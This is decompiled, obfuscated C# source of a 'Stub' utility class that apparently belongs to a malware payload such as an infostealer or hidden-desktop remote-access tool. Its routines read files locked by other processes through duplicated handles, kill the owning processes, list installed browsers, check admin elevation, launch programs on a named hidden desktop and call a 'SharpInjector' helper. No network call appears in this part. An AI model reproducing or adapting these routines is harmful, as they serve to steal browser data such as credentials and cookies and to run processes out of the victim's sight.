using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using dg3ypDAonQcOidMs0w;
using Microsoft.Win32;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000D3 RID: 211
	internal sealed class Utils
	{
		// Token: 0x06000321 RID: 801 RVA: 0x0001D4E8 File Offset: 0x0001B6E8
		public static string GenerateRandomString(int length)
		{
			StringBuilder stringBuilder = new StringBuilder(length);
			for (int i = 0; i < length; i++)
			{
				stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[Utils._random.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000322 RID: 802 RVA: 0x0001D538 File Offset: 0x0001B738
		public static bool IsAdmin()
		{
			bool flag;
			using (WindowsIdentity current = WindowsIdentity.GetCurrent())
			{
				WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
				flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
			}
			return flag;
		}

		// Token: 0x06000323 RID: 803 RVA: 0x0001D57C File Offset: 0x0001B77C
		public static bool IsProcessAdmin(int pid, out bool IsAdmin)
		{
			IsAdmin = false;
			IntPtr intPtr = NativeMethods.OpenProcess(Utils.PROCESS_QUERY_LIMITED_INFORMATION, false, (uint)pid);
			bool flag;
			if (intPtr == IntPtr.Zero)
			{
				flag = false;
			}
			else
			{
				bool flag2 = Utils.IsProcessAdmin(intPtr, out IsAdmin);
				NativeMethods.CloseHandle(intPtr);
				flag = flag2;
			}
			return flag;
		}

		// Token: 0x06000324 RID: 804 RVA: 0x0001D5BC File Offset: 0x0001B7BC
		public static bool IsProcessAdmin(IntPtr ProcessHandle, out bool IsAdmin)
		{
			IsAdmin = false;
			IntPtr intPtr;
			bool flag;
			if (!NativeMethods.OpenProcessToken(ProcessHandle, Utils.TOKEN_QUERY, out intPtr))
			{
				flag = false;
			}
			else
			{
				int num = Marshal.SizeOf(typeof(InternalStructs.TOKEN_ELEVATION));
				IntPtr intPtr2 = Marshal.AllocHGlobal(num);
				int num2;
				if (NativeMethods.GetTokenInformation(intPtr, Utils.TokenElevation, intPtr2, num, out num2) && num2 == num)
				{
					InternalStructs.TOKEN_ELEVATION token_ELEVATION = Marshal.PtrToStructure<InternalStructs.TOKEN_ELEVATION>(intPtr2);
					Marshal.FreeHGlobal(intPtr2);
					NativeMethods.CloseHandle(intPtr);
					IsAdmin = token_ELEVATION.TokenIsElevated > 0U;
					flag = true;
				}
				else
				{
					Marshal.FreeHGlobal(intPtr2);
					NativeMethods.CloseHandle(intPtr);
					flag = false;
				}
			}
			return flag;
		}

		// Token: 0x06000325 RID: 805 RVA: 0x0001D64C File Offset: 0x0001B84C
		public static bool ForceCopy(string target, string destination)
		{
			byte[] array = Utils.ForceReadFile(target, false);
			bool flag;
			if (array == null)
			{
				flag = false;
			}
			else
			{
				try
				{
					File.WriteAllBytes(destination, array);
				}
				catch
				{
					return false;
				}
				flag = true;
			}
			return flag;
		}

		// Token: 0x06000326 RID: 806 RVA: 0x0001D690 File Offset: 0x0001B890
		public static string ForceReadFileString(string filePath, bool killOwningProcessIfCouldntAquire = false)
		{
			byte[] array = Utils.ForceReadFile(filePath, killOwningProcessIfCouldntAquire);
			string text;
			if (array == null)
			{
				text = null;
			}
			else
			{
				try
				{
					return Encoding.UTF8.GetString(array);
				}
				catch
				{
				}
				text = null;
			}
			return text;
		}

		// Token: 0x06000327 RID: 807 RVA: 0x0001D6D4 File Offset: 0x0001B8D4
		public static byte[] ForceReadFile(string filePath, bool killOwningProcessIfCouldntAquire = false)
		{
			try
			{
				return File.ReadAllBytes(filePath);
			}
			catch (Exception ex)
			{
				if (ex.HResult != -2147024864)
				{
					return null;
				}
			}
			bool flag = false;
			int[] array;
			if (!Utils.GetProcessLockingFile(filePath, out array))
			{
				flag = true;
			}
			uint num = 0U;
			uint num2 = 3221225476U;
			int num3 = Marshal.SizeOf(typeof(InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
			IntPtr intPtr = Marshal.AllocHGlobal(num3);
			uint num4;
			do
			{
				num4 = NativeMethods.NtQuerySystemInformation(InternalStructs.SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, intPtr, num, out num);
				if (num4 == num2)
				{
					intPtr = Marshal.ReAllocHGlobal(intPtr, (IntPtr)((long)((ulong)num)));
				}
			}
			while (num4 > 0U);
			IntPtr intPtr2 = intPtr;
			ulong num5 = (ulong)(long)Marshal.ReadIntPtr(intPtr);
			intPtr += 2 * IntPtr.Size;
			byte[] array2 = null;
			for (ulong num6 = 0UL; num6 < num5; num6 += 1UL)
			{
				InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX system_HANDLE_TABLE_ENTRY_INFO_EX = Marshal.PtrToStructure<InternalStructs.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(intPtr + (int)(num6 * (ulong)num3));
				IntPtr intPtr3;
				if ((flag || array.Contains((int)(uint)system_HANDLE_TABLE_ENTRY_INFO_EX.UniqueProcessId)) && Utils.DupHandle((int)(uint)system_HANDLE_TABLE_ENTRY_INFO_EX.UniqueProcessId, (IntPtr)((long)(ulong)system_HANDLE_TABLE_ENTRY_INFO_EX.HandleValue), out intPtr3))
				{
					if (NativeMethods.GetFileType(intPtr3) != InternalStructs.FileType.FILE_TYPE_DISK)
					{
						NativeMethods.CloseHandle(intPtr3);
					}
					else
					{
						string text = Utils.GetPathFromHandle(intPtr3);
						if (text == null)
						{
							NativeMethods.CloseHandle(intPtr3);
						}
						else
						{
							if (text.StartsWith("\\\\?\\"))
							{
								text = text.Substring(4);
							}
							if (text == filePath)
							{
								array2 = Utils.ReadFileBytesFromHandle(intPtr3);
								NativeMethods.CloseHandle(intPtr3);
								if (array2 != null)
								{
									break;
								}
							}
							NativeMethods.CloseHandle(intPtr3);
						}
					}
				}
			}
			Marshal.FreeHGlobal(intPtr2);
			if (array2 == null && killOwningProcessIfCouldntAquire)
			{
				foreach (int num7 in array)
				{
					Utils.KillProcess(num7, 0U);
				}
				try
				{
					array2 = File.ReadAllBytes(filePath);
				}
				catch
				{
				}
			}
			return array2;
		}

		// Token: 0x06000328 RID: 808 RVA: 0x0001D8FC File Offset: 0x0001BAFC
		public static string GetPathFromHandle(IntPtr file)
		{
			StringBuilder stringBuilder = new StringBuilder(32769);
			uint finalPathNameByHandleW = NativeMethods.GetFinalPathNameByHandleW(file, stringBuilder, (uint)stringBuilder.Capacity, 0U);
			string text;
			if (finalPathNameByHandleW == 0U)
			{
				text = null;
			}
			else
			{
				string text2 = stringBuilder.ToString(0, (int)finalPathNameByHandleW);
				text = text2;
			}
			return text;
		}

		// Token: 0x06000329 RID: 809 RVA: 0x0001D93C File Offset: 0x0001BB3C
		public static bool DupHandle(int sourceProc, IntPtr sourceHandle, out IntPtr newHandle)
		{
			newHandle = IntPtr.Zero;
			uint num = 2U;
			IntPtr intPtr = NativeMethods.OpenProcess(64U, false, (uint)sourceProc);
			bool flag;
			if (intPtr == IntPtr.Zero)
			{
				flag = false;
			}
			else
			{
				IntPtr zero = IntPtr.Zero;
				if (!NativeMethods.DuplicateHandle(intPtr, sourceHandle, NativeMethods.GetCurrentProcess(), ref zero, 0U, false, num))
				{
					NativeMethods.CloseHandle(intPtr);
					flag = false;
				}
				else
				{
					newHandle = zero;
					NativeMethods.CloseHandle(intPtr);
					flag = true;
				}
			}
			return flag;
		}

		// Token: 0x0600032A RID: 810 RVA: 0x0001D9A8 File Offset: 0x0001BBA8
		public static bool GetProcessLockingFile(string filePath, out int[] process)
		{
			process = null;
			uint num = 234U;
			string text = Guid.NewGuid().ToString();
			uint num2;
			bool flag;
			if (NativeMethods.RmStartSession(out num2, 0U, text) > 0U)
			{
				flag = false;
			}
			else
			{
				string[] array = new string[] { filePath };
				if (NativeMethods.RmRegisterResources(num2, (uint)array.Length, array, 0U, null, 0U, null) > 0U)
				{
					NativeMethods.RmEndSession(num2);
					flag = false;
				}
				else
				{
					InternalStructs.RM_PROCESS_INFO[] array2;
					for (;;)
					{
						uint num3 = 0U;
						uint num5;
						InternalStructs.RM_REBOOT_REASON rm_REBOOT_REASON;
						uint num4 = NativeMethods.RmGetList(num2, out num5, ref num3, null, out rm_REBOOT_REASON);
						if (num4 != num)
						{
							break;
						}
						uint num6 = num5;
						array2 = new InternalStructs.RM_PROCESS_INFO[num5];
						num3 = num5;
						num4 = NativeMethods.RmGetList(num2, out num5, ref num3, array2, out rm_REBOOT_REASON);
						if (num4 == 0U)
						{
							goto IL_00C4;
						}
						if (num6 == num5)
						{
							goto IL_0108;
						}
					}
					NativeMethods.RmEndSession(num2);
					process = new int[0];
					return true;
					IL_00C4:
					process = new int[array2.Length];
					for (int i = 0; i < array2.Length; i++)
					{
						process[i] = (int)array2[i].Process.dwProcessId;
					}
					NativeMethods.RmEndSession(num2);
					return true;
					IL_0108:
					NativeMethods.RmEndSession(num2);
					flag = false;
				}
			}
			return flag;
		}

		// Token: 0x0600032B RID: 811 RVA: 0x0001DACC File Offset: 0x0001BCCC
		public static byte[] ReadFileBytesFromHandle(IntPtr handle)
		{
			uint num = 4U;
			IntPtr intPtr = NativeMethods.CreateFileMappingA(handle, IntPtr.Zero, 2U, 0U, 0U, null);
			byte[] array;
			ulong num2;
			if (intPtr == IntPtr.Zero)
			{
				array = null;
			}
			else if (!NativeMethods.GetFileSizeEx(handle, out num2))
			{
				NativeMethods.CloseHandle(intPtr);
				array = null;
			}
			else
			{
				IntPtr intPtr2 = NativeMethods.MapViewOfFile(intPtr, num, 0U, 0U, (UIntPtr)num2);
				if (intPtr2 == IntPtr.Zero)
				{
					NativeMethods.CloseHandle(intPtr);
					array = null;
				}
				else
				{
					byte[] array2 = new byte[num2];
					Marshal.Copy(intPtr2, array2, 0, (int)num2);
					NativeMethods.UnmapViewOfFile(intPtr2);
					NativeMethods.CloseHandle(intPtr);
					array = array2;
				}
			}
			return array;
		}

		// Token: 0x0600032C RID: 812 RVA: 0x0001DB6C File Offset: 0x0001BD6C
		public static bool KillProcess(int pid, uint exitcode = 0U)
		{
			IntPtr intPtr = NativeMethods.OpenProcess(1U, false, (uint)pid);
			bool flag;
			if (intPtr == IntPtr.Zero)
			{
				flag = false;
			}
			else
			{
				bool flag2 = NativeMethods.TerminateProcess(intPtr, exitcode);
				NativeMethods.CloseHandle(intPtr);
				flag = flag2;
			}
			return flag;
		}

		// Token: 0x0600032D RID: 813 RVA: 0x0001DBA8 File Offset: 0x0001BDA8
		public static bool CompareByteArrays(byte[] b1, byte[] b2)
		{
			bool flag;
			if (b1 == null || b2 == null)
			{
				flag = b1 == b2;
			}
			else
			{
				flag = b1.Length == b2.Length && NativeMethods.memcmp(b1, b2, (UIntPtr)((ulong)((long)b1.Length))) == 0;
			}
			return flag;
		}

		// Token: 0x0600032E RID: 814 RVA: 0x0001DBF0 File Offset: 0x0001BDF0
		public static string ReverseString(string str)
		{
			char[] array = str.ToCharArray();
			Array.Reverse(array);
			return new string(array);
		}

		// Token: 0x0600032F RID: 815 RVA: 0x0001DC14 File Offset: 0x0001BE14
		public static object ReadRegistryKeyValue(RegistryHive hive, string location, string value)
		{
			foreach (RegistryView registryView in Utils.registryViews)
			{
				if (registryView != RegistryView.Registry64 || Environment.Is64BitOperatingSystem)
				{
					RegistryKey registryKey = null;
					RegistryKey registryKey2 = null;
					try
					{
						registryKey = RegistryKey.OpenBaseKey(hive, registryView);
						if (registryKey != null)
						{
							registryKey2 = registryKey.OpenSubKey(location);
							if (registryKey2 == null)
							{
								registryKey.Dispose();
							}
							else
							{
								object value2 = registryKey2.GetValue(value);
								if (value2 != null)
								{
									return value2;
								}
								registryKey.Dispose();
								registryKey2.Dispose();
							}
						}
					}
					catch
					{
					}
					finally
					{
						if (registryKey != null)
						{
							registryKey.Dispose();
						}
						if (registryKey2 != null)
						{
							registryKey2.Dispose();
						}
					}
				}
			}
			return null;
		}

		// Token: 0x06000330 RID: 816 RVA: 0x0001DCE4 File Offset: 0x0001BEE4
		public static byte[] ConvertHexStringToByteArray(string hexString)
		{
			byte[] array;
			if (hexString.Length % 2 != 0)
			{
				array = null;
			}
			else
			{
				byte[] array2 = new byte[hexString.Length / 2];
				for (int i = 0; i < array2.Length; i++)
				{
					string text = hexString.Substring(i * 2, 2);
					array2[i] = byte.Parse(text, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
				}
				array = array2;
			}
			return array;
		}

		// Token: 0x06000331 RID: 817 RVA: 0x0001DD44 File Offset: 0x0001BF44
		public static string[] GetInstalledBrowsers()
		{
			HashSet<string> hashSet = new HashSet<string>();
			string[] array = new string[] { "SOFTWARE\\Clients\\StartMenuInternet", "SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet" };
			RegistryKey[] array2 = new RegistryKey[]
			{
				Registry.LocalMachine,
				Registry.CurrentUser
			};
			foreach (RegistryKey registryKey in array2)
			{
				foreach (string text in array)
				{
					try
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(text))
						{
							if (registryKey2 != null)
							{
								foreach (string text2 in registryKey2.GetSubKeyNames())
								{
									try
									{
										using (RegistryKey registryKey3 = registryKey2.OpenSubKey(text2))
										{
											using (RegistryKey registryKey4 = ((registryKey3 != null) ? registryKey3.OpenSubKey("shell\\open\\command") : null))
											{
												if (registryKey4 != null)
												{
													string text3 = registryKey4.GetValue(null) as string;
													if (!string.IsNullOrEmpty(text3) && !text3.Contains("iexplore.exe"))
													{
														text3 = text3.Trim(new char[] { '"' });
														hashSet.Add(text3);
													}
												}
											}
										}
									}
									catch
									{
									}
								}
							}
						}
						goto IL_014E;
					}
					catch
					{
						goto IL_014E;
					}
					break;
					IL_014E:;
				}
			}
			return hashSet.ToArray<string>();
		}

		// Token: 0x06000332 RID: 818 RVA: 0x0001DEF4 File Offset: 0x0001C0F4
		private static int LevenshteinDistance(string s1, string s2)
		{
			int[,] array = new int[s1.Length + 1, s2.Length + 1];
			for (int i = 0; i <= s1.Length; i++)
			{
				array[i, 0] = i;
			}
			for (int j = 0; j <= s2.Length; j++)
			{
				array[0, j] = j;
			}
			for (int k = 1; k <= s1.Length; k++)
			{
				for (int l = 1; l <= s2.Length; l++)
				{
					int num = ((s1[k - 1] == s2[l - 1]) ? 0 : 1);
					array[k, l] = Math.Min(Math.Min(array[k - 1, l] + 1, array[k, l - 1] + 1), array[k - 1, l - 1] + num);
				}
			}
			return array[s1.Length, s2.Length];
		}

		// Token: 0x06000333 RID: 819 RVA: 0x0001E000 File Offset: 0x0001C200
		public static double CalculateStringSimilarity(string s1, string s2)
		{
			int num = Math.Max(s1.Length, s2.Length);
			double num2;
			if (num == 0)
			{
				num2 = 1.0;
			}
			else
			{
				int num3 = Utils.LevenshteinDistance(s1, s2);
				num2 = (1.0 - (double)num3 / (double)num) * 100.0;
			}
			return num2;
		}

		// Token: 0x06000334 RID: 820 RVA: 0x0001E054 File Offset: 0x0001C254
		public static bool IsProcess64Bit(IntPtr handle)
		{
			bool flag;
			try
			{
				NativeMethods.IsWow64Process(handle, out flag);
			}
			catch
			{
				return Environment.Is64BitOperatingSystem;
			}
			return !flag;
		}

		// Token: 0x06000335 RID: 821 RVA: 0x0001E08C File Offset: 0x0001C28C
		public static byte[] GetCurrentSelfBytes()
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			MethodInfo method = executingAssembly.GetType().GetMethod("GetRawBytes", BindingFlags.Instance | BindingFlags.NonPublic);
			return (byte[])method.Invoke(executingAssembly, null);
		}

		// Token: 0x06000336 RID: 822 RVA: 0x0001E0C4 File Offset: 0x0001C2C4
		public static string GetProcessDesktopName(IntPtr hProcess)
		{
			string text;
			if (Utils.IsProcess64Bit(hProcess))
			{
				text = Utils64.GetProcessDesktopName64(hProcess);
			}
			else
			{
				text = Utils32.GetProcessDesktopName32(hProcess);
			}
			return text;
		}

		// Token: 0x06000337 RID: 823 RVA: 0x0001E0EC File Offset: 0x0001C2EC
		public static bool StartProcessInDesktop(string DesktopName, string Application, out int ProcessId)
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append(Application);
			InternalStructs.STARTUPINFOW startupinfow = new InternalStructs.STARTUPINFOW
			{
				cb = (uint)Marshal.SizeOf(typeof(InternalStructs.STARTUPINFOW)),
				lpDesktop = DesktopName
			};
			IntPtr intPtr = Marshal.AllocHGlobal((int)startupinfow.cb);
			Marshal.StructureToPtr<InternalStructs.STARTUPINFOW>(startupinfow, intPtr, false);
			InternalStructs.PROCESS_INFORMATION process_INFORMATION;
			bool flag = NativeMethods.CreateProcessW(null, stringBuilder, IntPtr.Zero, IntPtr.Zero, false, Utils.CREATE_NEW_CONSOLE | Utils.NORMAL_PRIORITY_CLASS, IntPtr.Zero, null, intPtr, out process_INFORMATION);
			Marshal.FreeHGlobal(intPtr);
			ProcessId = (int)process_INFORMATION.dwProcessId;
			return flag;
		}

		// Token: 0x06000338 RID: 824 RVA: 0x0001E178 File Offset: 0x0001C378
		public static string GetTemporaryDirectory()
		{
			string text = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
			string text2;
			if (File.Exists(text))
			{
				text2 = Utils.GetTemporaryDirectory();
			}
			else
			{
				Directory.CreateDirectory(text);
				text2 = text;
			}
			return text2;
		}

		// Token: 0x06000339 RID: 825 RVA: 0x0001E1B0 File Offset: 0x0001C3B0
		public static int[] GetAllProcessOnDesktop(string deskopName)
		{
			List<int> list = new List<int>();
			foreach (Process process in Process.GetProcesses())
			{
				int id = process.Id;
				IntPtr processHandleWithRequiredRights = SharpInjector.GetProcessHandleWithRequiredRights(id);
				process.Close();
				if (processHandleWithRequiredRights != IntPtr.Zero)
				{
					string processDesktopName = Utils.GetProcessDesktopName(processHandleWithRequiredRights);
					if (processDesktopName != null && processDesktopName.ToLower() == deskopName.ToLower())
					{
						list.Add(id);
					}
					NativeMethods.CloseHandle(processHandleWithRequiredRights);
				}
			}
			return list.ToArray();
		}

		// Token: 0x0600033A RID: 826 RVA: 0x000038B4 File Offset: 0x00001AB4
		public Utils()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600033B RID: 827 RVA: 0x0001E240 File Offset: 0x0001C440
		static Utils()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			Utils.PROCESS_QUERY_INFORMATION = 1024U;
			Utils.PROCESS_QUERY_LIMITED_INFORMATION = 4096U;
			Utils.TokenElevation = 20;
			Utils.TOKEN_ASSIGN_PRIMARY = 1U;
			Utils.TOKEN_DUPLICATE = 2U;
			Utils.TOKEN_QUERY = 8U;
			Utils.TOKEN_ADJUST_DEFAULT = 128U;
			Utils.TOKEN_ADJUST_SESSIONID = 256U;
			Utils.CREATE_NEW_CONSOLE = 16U;
			Utils.NORMAL_PRIORITY_CLASS = 32U;
			Utils._random = new Random();
			Utils.registryViews = new RegistryView[]
			{
				RegistryView.Registry64,
				RegistryView.Registry32
			};
		}

		// Token: 0x04000625 RID: 1573
		private static uint PROCESS_QUERY_INFORMATION;

		// Token: 0x04000626 RID: 1574
		private static uint PROCESS_QUERY_LIMITED_INFORMATION;

		// Token: 0x04000627 RID: 1575
		private static int TokenElevation;

		// Token: 0x04000628 RID: 1576
		private static uint TOKEN_ASSIGN_PRIMARY;

		// Token: 0x04000629 RID: 1577
		private static uint TOKEN_DUPLICATE;

		// Token: 0x0400062A RID: 1578
		private static uint TOKEN_QUERY;

		// Token: 0x0400062B RID: 1579
		private static uint TOKEN_ADJUST_DEFAULT;

		// Token: 0x0400062C RID: 1580
		private static uint TOKEN_ADJUST_SESSIONID;

		// Token: 0x0400062D RID: 1581
		private static uint CREATE_NEW_CONSOLE;

		// Token: 0x0400062E RID: 1582
		private static uint NORMAL_PRIORITY_CLASS;

		// Token: 0x0400062F RID: 1583
		private static readonly Random _random;

		// Token: 0x04000630 RID: 1584
		private static RegistryView[] registryViews;
	}
}
